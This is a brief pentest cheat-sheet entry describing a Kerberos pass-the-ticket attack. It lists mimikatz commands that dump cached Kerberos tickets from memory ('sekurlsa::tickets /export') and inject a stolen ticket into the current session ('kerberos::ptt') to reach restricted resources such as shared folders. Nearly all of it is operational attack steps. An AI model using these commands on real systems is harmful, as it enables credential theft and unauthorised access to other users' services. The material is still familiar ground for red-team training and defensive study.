# This kind of attack allows the reuse o reinjection of a TGS from another user or session in our session allowing to access to a restricted service like a shared folder or something of the kind.

# We need to use mimikatz in order to dump cached TGSs 

privilege::debug
sekurlsa::tickets /export

# And then import the ticket into our session:

kerberos::ptt <TICKETkirbi>

# We can see if our injection has been succefull with klist.
